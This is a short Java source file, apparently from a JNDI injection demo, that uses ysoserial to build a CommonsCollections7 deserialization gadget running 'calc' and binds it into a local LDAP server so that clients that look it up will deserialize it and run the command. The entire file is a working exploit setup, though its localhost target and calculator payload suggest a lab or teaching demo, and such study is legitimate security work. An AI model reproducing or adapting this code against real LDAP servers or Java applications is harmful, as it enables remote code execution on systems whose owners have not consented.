package jndidemo.ldap;

import com.sun.jndi.ldap.LdapCtxFactory;
import ysoserial.payloads.ObjectPayload;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.util.Hashtable;

public class LdapServerSerData {
    public static void main(String[] args) throws NamingException {
        //System.out.println("Befor:"+LdapCtxFactory.class.isArray());
        Hashtable env=new Hashtable();
        env.put(Context.INITIAL_CONTEXT_FACTORY,"com.sun.jndi.ldap.LdapCtxFactory");
        env.put(Context.PROVIDER_URL,"ldap://127.0.0.1:1389/dc=example,dc=com");
        String payloadType="CommonsCollections7";
        String payloadArg="calc";
        Object payloadObject = ObjectPayload.Utils.makePayloadObject(payloadType,payloadArg);
        Context ctx = new InitialContext(env);
        ctx.rebind("foo=any",payloadObject);
        //System.out.println("After:"+ LdapCtxFactory.class.isArray());
    }
}
